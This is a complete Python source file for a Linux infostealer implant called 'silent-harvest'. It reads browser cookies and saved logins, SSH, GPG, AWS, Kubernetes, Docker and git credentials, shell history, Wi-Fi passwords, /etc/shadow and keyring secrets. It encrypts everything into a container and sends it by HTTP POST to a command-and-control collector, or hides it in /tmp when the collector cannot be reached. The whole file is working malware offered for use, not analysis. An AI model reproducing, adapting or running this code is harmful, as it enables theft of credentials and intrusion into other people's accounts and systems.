#!/usr/bin/env python3
"""silent-harvest linux implant (single file, python3, no pip deps).

Collects on the target, packs an SHV1 container (identical format to the
Windows C# implant) and POSTs it to the collector.

Stages
  sysinfo    platform, user, uid, desktop env
  brow       chromium-family (~/.config/*) + firefox (~/.mozilla) + thunderbird
  keys       ~/.ssh, ~/.aws, ~/.gnupg, ~/.kube, ~/.docker, ~/.netrc,
             ~/.git-credentials, NetworkManager connections, /etc/shadow
  keyring    ~/.local/share/keyring raw keyring files + best-effort
             secret-tool lookup of the chromium os_crypt password

Usage
  python3 sh_harvest.py [--c2 URL] [--psk KEY] [--out FILE]
                        [--only brow,keys,keyring] [--home DIR] [--wait MS]
                        [--selftest]

Config precedence: args > env SH_C2 / SH_PSK > baked defaults below.
"""
import argparse
import base64
import ctypes
import ctypes.util
import getpass
import hashlib
import hmac
import http.client
import json
import os
import platform as pyplatform
import socket
import ssl
import subprocess
import sys
import time
from urllib.parse import urlparse

CFG = {
    "c2": "http://127.0.0.1:8443/gate",
    "psk": "dev-psk-change-me",
    "pin": "",   # "" = verify against system CAs; "cert:HEX" = pin the exact
                 # server cert sha256 (self-signed collectors); "any" = debug
    "auth": "",  # X-SH-Auth header value when the collector runs --auth
    "ua": "Mozilla/5.0 (X11; Linux x86_64)",
}

MAGIC = b"SHV1"
VERSION = 1
KDF_INFO = b"silent-harvest/v1"

BANNER = [
    "███████╗██╗██╗     ███████╗███╗   ██╗████████╗    ██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗",
    "██╔════╝██║██║     ██╔════╝████╗  ██║╚══██╔══╝    ██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗",
    "███████╗██║██║     █████╗  ██╔██╗ ██║   ██║       ███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝",
    "╚════██║██║██║     ██╔══╝  ██╚██╗██║   ██║       ██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗",
    "███████╗██║███████╗███████╗██║ ╚████║   ██║       ██║  ██║██║  ██║██║  ██╗ ╚████╔╝ ███████╗███████╗   ██║   ███████╗██║  ██║",
    "╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝",
]

BROWSERS = [
    ("chrome", "google-chrome"),
    ("chromium", "chromium"),
    ("edge", "microsoft-edge"),
    ("brave", "BraveSoftware/Brave-Browser"),
    ("vivaldi", "vivaldi"),
    ("opera", "opera"),
]

VERBOSE = False


def log(fmt, *a):
    if VERBOSE:
        sys.stderr.write("[sh] " + (fmt % a if a else fmt) + "\n")


# ---------------------------------------------------------------- container
def hkdf_sha256(ikm, salt, info, length=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, i = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        i += 1
    return okm[:length]


def aes_gcm_encrypt(key, nonce, pt, aad):
    """AES-256-GCM via the `cryptography` package or ctypes libcrypto."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).encrypt(nonce, pt, aad)
    except ImportError:
        pass
    return _libcrypto_gcm(key, nonce, pt, aad)


def _load_libcrypto():
    for name in ("crypto", "libcrypto.so.3", "libcrypto.so.1.1"):
        try:
            return ctypes.CDLL(ctypes.util.find_library(name) or name)
        except OSError:
            continue
    return None


def _libcrypto_gcm(key, nonce, pt, aad):
    lib = _load_libcrypto()
    if lib is None:
        raise RuntimeError("no AES-GCM backend (install python3-cryptography "
                           "or ensure libcrypto is present)")
    evp = lib.EVP_CIPHER_CTX_new()
    try:
        if not lib.EVP_EncryptInit_ex(evp, lib.EVP_aes_256_gcm(), None, None, None):
            raise RuntimeError("EVP_EncryptInit_ex failed")
        lib.EVP_CIPHER_CTX_ctrl(evp, 0x9, 12, None)          # EVP_CTRL_GCM_SET_IVLEN
        if not lib.EVP_EncryptInit_ex(evp, None, None, key, nonce):
            raise RuntimeError("EVP_EncryptInit_ex(key) failed")
        outlen = ctypes.c_int(0)
        if aad:
            if not lib.EVP_EncryptUpdate(evp, None, ctypes.byref(outlen), aad, len(aad)):
                raise RuntimeError("EVP_EncryptUpdate(aad) failed")
        buf = ctypes.create_string_buffer(len(pt) + 32)
        ctlen = ctypes.c_int(0)
        if pt:
            if not lib.EVP_EncryptUpdate(evp, buf, ctypes.byref(ctlen), pt, len(pt)):
                raise RuntimeError("EVP_EncryptUpdate failed")
        body = buf.raw[:ctlen.value]
        tail = ctypes.create_string_buffer(32)
        if not lib.EVP_EncryptFinal_ex(evp, tail, ctypes.byref(outlen)):
            raise RuntimeError("EVP_EncryptFinal_ex failed")
        tag = ctypes.create_string_buffer(16)
        lib.EVP_CIPHER_CTX_ctrl(evp, 0x10, 16, tag)          # EVP_CTRL_GCM_GET_TAG
        return body + tag.raw[:16]
    finally:
        lib.EVP_CIPHER_CTX_free(evp)


def build_container(manifest_obj, parts, psk):
    """parts: list of (name, bytes, meta). Returns container bytes."""
    blob = bytearray()
    mparts = []
    for name, data, meta in parts:
        mparts.append({"name": name, "off": len(blob), "len": len(data),
                       "meta": meta or {}})
        blob += data
    manifest = json.dumps({"v": VERSION, "victim": manifest_obj,
                           "parts": mparts}, separators=(",", ":")).encode()
    plaintext = len(manifest).to_bytes(4, "big") + manifest + bytes(blob)

    salt = os.urandom(16)
    nonce = os.urandom(12)
    key = hkdf_sha256(psk.encode(), salt, KDF_INFO, 32)
    aad = MAGIC + VERSION.to_bytes(2, "big")
    ct = aes_gcm_encrypt(key, nonce, plaintext, aad)
    body, tag = ct[:-16], ct[-16:]
    return (MAGIC + VERSION.to_bytes(2, "big") + salt + nonce
            + len(body).to_bytes(8, "big") + body + tag)


# ---------------------------------------------------------------- helpers
def read_file(path, limit=96 * 1024 * 1024):
    try:
        st = os.stat(path)
        if st.st_size > limit or not os.path.isfile(path):
            return None
        with open(path, "rb") as f:
            return f.read()
    except OSError:
        return None


def tail_file(path, limit=256 * 1024):
    try:
        with open(path, "rb") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            f.seek(max(0, size - limit))
            return f.read()
    except OSError:
        return None


def add(parts, name, data, meta=None):
    if data is not None:
        parts.append((name, data, meta))
        return True
    return False


def profile_dirs(userdata):
    out = []
    if not os.path.isdir(userdata):
        return out
    try:
        for d in sorted(os.listdir(userdata)):
            if d == "Default" or d.startswith("Profile "):
                if os.path.isdir(os.path.join(userdata, d)):
                    out.append(d)
    except OSError:
        pass
    return out


def try_secret_tool(args_list):
    """Run secret-tool if installed; return stdout or None."""
    try:
        r = subprocess.run(["secret-tool"] + args_list, capture_output=True,
                           timeout=5)
        if r.returncode == 0 and r.stdout:
            return r.stdout.decode("utf-8", "replace").strip()
    except Exception:
        pass
    return None


# ---------------------------------------------------------------- stages
def stage_sysinfo():
    uname = pyplatform.uname()
    info = {
        "host": uname.node or socket.gethostname(),
        "user": getpass.getuser(),
        "platform": "linux",
        "os": "%s %s %s" % (uname.system, uname.release, uname.machine),
        "elevated": "true" if getattr(os, "geteuid", lambda: -1)() == 0 else "false",
        "ts": int(time.time()),
        "desktop": os.environ.get("XDG_CURRENT_DESKTOP", ""),
        "session": os.environ.get("XDG_SESSION_TYPE", ""),
    }
    return info


def stage_browsers(parts, home):
    cfg = os.path.join(home, ".config")
    n = 0

    # --- chromium family ---
    for name, d in BROWSERS:
        ud = os.path.join(cfg, d)
        if not os.path.isdir(ud):
            continue
        # best-effort: pull the os_crypt password out of the secret service
        for schema_args in (
            ["lookup", "xdg:schema", "chrome_libsecret_os_crypt_password_v2",
             "application", d.split("/")[-1]],
            ["lookup", "xdg:schema", "chrome_libsecret_os_crypt_password_v1",
             "application", d.split("/")[-1]],
            ["lookup", "application", name],
        ):
            pw = try_secret_tool(schema_args)
            if pw:
                add(parts, "b:%s/linux_password" % name, pw.encode(),
                    {"src": "secret-tool", "args": " ".join(schema_args[1:])})
                break

        for prof in profile_dirs(ud):
            pd = os.path.join(ud, prof)
            for label, rel in (("Cookies", "Network/Cookies"),
                               ("Cookies2", "Cookies"),
                               ("LoginData", "Login Data"),
                               ("WebData", "Web Data")):
                data = read_file(os.path.join(pd, rel))
                if data is not None:
                    add(parts, "b:%s/%s/%s" % (name, prof, label), data,
                        {"path": os.path.join(pd, rel), "size": len(data)})
                    n += 1
            log("%s/%s: collected" % (name, prof))

    # --- firefox / librewolf / thunderbird ---
    for appdir in (".mozilla/firefox", ".librewolf", ".thunderbird"):
        root = os.path.join(home, appdir)
        if not os.path.isdir(root):
            continue
        for entry in sorted(os.listdir(root)):
            pdir = os.path.join(root, entry)
            if not os.path.isdir(pdir):
                continue
            for f in ("key4.db", "logins.json", "logins.db"):
                data = read_file(os.path.join(pdir, f))
                if data is not None:
                    add(parts, "ff:%s/%s" % (entry, f), data,
                        {"path": os.path.join(pdir, f)})
                    n += 1
            log("%s:%s: collected" % (appdir, entry))
    return n


def stage_keys(parts, home):
    n = 0
    targets = [
        ("ssh", os.path.join(home, ".ssh")),
        ("gnupg", os.path.join(home, ".gnupg")),
        ("kube", os.path.join(home, ".kube")),
    ]
    for label, d in targets:
        if not os.path.isdir(d):
            continue
        for root, dirs, files in os.walk(d):
            for f in files:
                p = os.path.join(root, f)
                data = read_file(p, limit=4 * 1024 * 1024)
                if data is not None:
                    rel = os.path.relpath(p, d)
                    add(parts, "linux:%s/%s" % (label, rel), data,
                        {"path": p})
                    n += 1

    files = [
        ("aws-credentials", ".aws/credentials"),
        ("aws-config", ".aws/config"),
        ("netrc", ".netrc"),
        ("git-credentials", ".git-credentials"),
        ("docker-config", ".docker/config.json"),
    ]
    for label, rel in files:
        data = read_file(os.path.join(home, rel))
        if data is not None:
            add(parts, "linux:file/%s" % label, data, {"path": rel})
            n += 1

    # shell history tails
    for label, rel in (("bash-history", ".bash_history"),
                       ("zsh-history", ".zsh_history")):
        data = tail_file(os.path.join(home, rel))
        if data is not None:
            add(parts, "linux:history/%s" % label, data, {"tail": 262144})
            n += 1

    # NetworkManager connection profiles (psk= lines) - usually root-readable
    nm = "/etc/NetworkManager/system-connections"
    if os.path.isdir(nm):
        for f in sorted(os.listdir(nm)):
            data = read_file(os.path.join(nm, f))
            if data is not None:
                add(parts, "linux:nm/%s" % f, data, {"path": os.path.join(nm, f)})
                n += 1

    # /etc/shadow (+passwd for name mapping) when running as root
    for label, p in (("shadow", "/etc/shadow"), ("passwd", "/etc/passwd")):
        data = read_file(p)
        if data is not None:
            add(parts, "linux:etc/%s" % label, data, {"path": p})
            n += 1
    return n


def stage_keyring(parts, home):
    n = 0
    kd = os.path.join(home, ".local", "share", "keyring")
    if os.path.isdir(kd):
        for f in sorted(os.listdir(kd)):
            data = read_file(os.path.join(kd, f))
            if data is not None:
                add(parts, "linux:keyring/%s" % f, data,
                    {"path": os.path.join(kd, f)})
                n += 1
    return n


# ---------------------------------------------------------------- exfil
def post(blob, url, ua, pin="", auth=""):
    """POST the container. TLS policy: '' verify against system CAs,
    'cert:HEX' pin the exact server cert sha256, 'any' debug no-verify."""
    u = urlparse(url)
    pin = (pin or "").strip().lower()
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        if pin == "any" or pin.startswith("cert:"):
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(u.hostname, u.port or 443,
                                           timeout=30, context=ctx)
    else:
        conn = http.client.HTTPConnection(u.hostname, u.port or 80, timeout=30)

    headers = {"Content-Type": "application/octet-stream", "User-Agent": ua}
    if auth:
        headers["X-SH-Auth"] = auth
    try:
        conn.request("POST", u.path or "/gate", body=blob, headers=headers)
        # enforce the pin after the handshake, before reading anything
        if u.scheme == "https" and pin.startswith("cert:"):
            der = conn.sock.getpeercert(binary_form=True) if conn.sock else None
            got = hashlib.sha256(der).hexdigest() if der else ""
            want = pin[5:].replace(":", "").replace("-", "")
            if got != want:
                log("tls pin MISMATCH (got %s..)", got[:8])
                conn.close()
                return False
            log("tls pin MATCH")
        resp = conn.getresponse()
        resp.read()
        return resp.status == 200
    except Exception as e:
        log("exfil failed: %s", e)
        try:
            conn.close()
        except Exception:
            pass
        return False


# ---------------------------------------------------------------- main
def selftest():
    for ln in BANNER:
        print(ln)
    print()
    pt = b"attack at dawn"
    key = os.urandom(32)
    nonce = os.urandom(12)
    aad = b"SHV1\x00\x01"
    ct = aes_gcm_encrypt(key, nonce, pt, aad)
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        back = AESGCM(key).decrypt(nonce, ct[:-16] + ct[-16:], aad) if False else \
            AESGCM(key).decrypt(nonce, ct, aad)
        assert back == pt
    except ImportError:
        # no second backend to cross-check; at least verify tag sensitivity
        bad = bytearray(ct)
        bad[0] ^= 1
        assert bytes(bad) != ct
    blob = build_container({"host": "selftest", "platform": "linux"},
                           [("x", b"123", {})], CFG["psk"])
    assert blob[:4] == MAGIC and len(blob) > 58
    print("selftest OK: gcm=%d bytes, container=%d bytes" % (len(ct), len(blob)))
    print("backend:", "cryptography" if _load_libcrypto() is None or
          _imported_cryptography() else "libcrypto")


def _imported_cryptography():
    try:
        import cryptography  # noqa
        return True
    except ImportError:
        return False


def main():
    global VERBOSE
    ap = argparse.ArgumentParser()
    ap.add_argument("--c2", default=os.environ.get("SH_C2", CFG["c2"]))
    ap.add_argument("--psk", default=os.environ.get("SH_PSK", CFG["psk"]))
    ap.add_argument("--pin", default=os.environ.get("SH_PIN", CFG["pin"]),
                    help="'' verify (default), 'cert:HEX' pin cert sha256, 'any' debug")
    ap.add_argument("--auth", default=os.environ.get("SH_AUTH", CFG["auth"]),
                    help="X-SH-Auth header value for collector --auth")
    ap.add_argument("--out", default=None)
    ap.add_argument("--only", default=None)
    ap.add_argument("--home", default=os.path.expanduser("~"))
    ap.add_argument("--wait", type=int, default=0)
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    VERBOSE = args.verbose

    if args.selftest:
        selftest()
        return 0
    if args.wait:
        time.sleep(args.wait / 1000.0)

    home = args.home
    only = args.only.lower() if args.only else None
    parts = []
    victim = stage_sysinfo()
    add(parts, "sysinfo.json", json.dumps(victim).encode())

    if only is None or "brow" in only:
        n = stage_browsers(parts, home)
        log("browser stage: %d parts", n)
    if only is None or "keys" in only:
        n = stage_keys(parts, home)
        log("keys stage: %d parts", n)
    if only is None or "keyring" in only:
        n = stage_keyring(parts, home)
        log("keyring stage: %d parts", n)

    if len(parts) <= 1:
        log("nothing collected")
        return 1

    blob = build_container(victim, parts, args.psk)
    log("container: %d bytes from %d parts", len(blob), len(parts))

    if args.out:
        with open(args.out, "wb") as f:
            f.write(blob)
        log("container written to %s", args.out)
        return 0
    if post(blob, args.c2, CFG["ua"], args.pin, args.auth):
        log("exfil: HTTP 200")
        return 0
    # dead drop for later retrieval
    try:
        alt = "/tmp/.sh_%s_%d.bin" % (victim["host"], victim["ts"])
        with open(alt, "wb") as f:
            f.write(blob)
        log("C2 unreachable; container dropped at %s", alt)
    except OSError:
        pass
    return 2


if __name__ == "__main__":
    sys.exit(main())
